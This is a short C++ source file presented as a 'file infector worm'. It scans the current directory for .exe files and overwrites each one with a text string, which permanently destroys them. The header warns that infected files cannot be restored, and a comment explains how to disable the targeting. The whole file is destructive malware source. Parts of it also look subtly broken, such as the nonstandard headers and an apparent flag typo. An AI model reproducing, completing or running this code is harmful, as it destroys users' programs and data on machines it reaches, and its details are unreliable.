// C++ File Infector Worm
/* 
    Author: Daniel Krilich
*/

// ----------- DO NOT COMPILE THIS CODE DIRECTLY --------------- 
// ----------- INFECTED FILES WILL NOT RESTORE   ---------------

#include <iostream>
#include <dir>
#include <dos>
#include <fstream>

void main() {

    struct ffblk f;
    int done;
    ofstream file;

    done = findfirst("*.exe", &f, FA_HIDDEN | RA_RDONLY);  // CHANGE ".EXE" to anything such as .test or any non-populating end point if you wish to compile w/o propagation
    while (!done)

    {
        cout << f.ff_name << endl;
        file.open(f.ff_name, ios::binary);
        file << "hi i am a file infector";
        file.close();

        done = findnext (&f);
    }
}